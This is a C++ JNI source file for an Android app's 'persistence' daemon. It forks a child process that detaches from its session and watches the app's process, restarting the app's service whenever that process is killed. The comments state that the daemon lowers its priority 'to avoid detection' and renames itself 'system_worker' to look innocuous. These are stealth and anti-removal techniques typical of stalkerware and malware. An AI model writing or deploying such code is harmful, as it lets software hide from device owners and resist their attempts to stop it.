#include <jni.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <android/log.h>
#include <fstream>
#include <string>

#define LOG_TAG "FasonDaemon"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static volatile pid_t g_daemon_pid = -1;
static volatile bool g_running = false;
static std::string g_service_component;
static int g_parent_pid = -1;

// Check if a process exists
static bool process_alive(pid_t pid) {
    if (pid <= 0) return false;
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d", pid);
    return access(path, F_OK) == 0;
}

// Restart the service via am startservice
static void restart_service() {
    if (g_service_component.empty()) return;

    std::string cmd = "am startservice -n " + g_service_component;
    cmd += " --user 0";

    LOGI("Restarting service: %s", g_service_component.c_str());
    int result = system(cmd.c_str());
    if (result != 0) {
        LOGW("Service restart returned: %d", result);
    }
}

// Daemon main loop — runs in forked child
static void daemon_loop() {
    // Detach from parent session
    setsid();

    // Set low priority to avoid detection
    nice(19);

    // Rename process to something innocuous
    prctl(PR_SET_NAME, "system_worker", 0, 0, 0);

    LOGI("Daemon loop started, monitoring parent PID %d", g_parent_pid);

    int check_count = 0;
    while (g_running) {
        if (!process_alive(g_parent_pid)) {
            LOGW("Parent process %d dead — restarting service", g_parent_pid);
            restart_service();

            // Wait a bit for service to start, then find new parent
            sleep(5);

            // Try to find new parent PID from service
            // For now, exit and let the service restart us
            break;
        }

        // Periodic heartbeat every 60 seconds
        sleep(60);
        check_count++;

        // Every 10 minutes, verify service is actually running
        if (check_count >= 10) {
            check_count = 0;
            // The service should have called us back by now if it restarted
            // If not, the parent PID check will catch it next cycle
        }
    }

    LOGI("Daemon loop exiting");
    _exit(0);
}

extern "C" JNIEXPORT jint JNICALL
Java_com_fason_app_persistence_daemon_NativeDaemon_nativeStartDaemon(
        JNIEnv* env, jclass clazz, jint parent_pid, jstring service_component) {

    if (g_running) {
        LOGW("Daemon already running");
        return 0;
    }

    const char* comp_str = env->GetStringUTFChars(service_component, nullptr);
    if (comp_str == nullptr) return -1;
    g_service_component = comp_str;
    env->ReleaseStringUTFChars(service_component, comp_str);

    g_parent_pid = parent_pid;

    // Fork daemon process
    pid_t pid = fork();
    if (pid < 0) {
        LOGE("Fork failed: %d", errno);
        return -2;
    }

    if (pid == 0) {
        // Child process — daemon
        g_running = true;
        daemon_loop();
        return 0; // Never reached
    }

    // Parent process
    g_daemon_pid = pid;
    g_running = true;
    LOGI("Daemon forked, PID: %d", pid);

    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_fason_app_persistence_daemon_NativeDaemon_nativeStopDaemon(
        JNIEnv* env, jclass clazz) {

    g_running = false;

    if (g_daemon_pid > 0) {
        kill(g_daemon_pid, SIGTERM);
        g_daemon_pid = -1;
    }

    LOGI("Daemon stopped");
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_fason_app_persistence_daemon_NativeDaemon_nativePing(
        JNIEnv* env, jclass clazz) {
    return g_running ? 1 : 0;
}
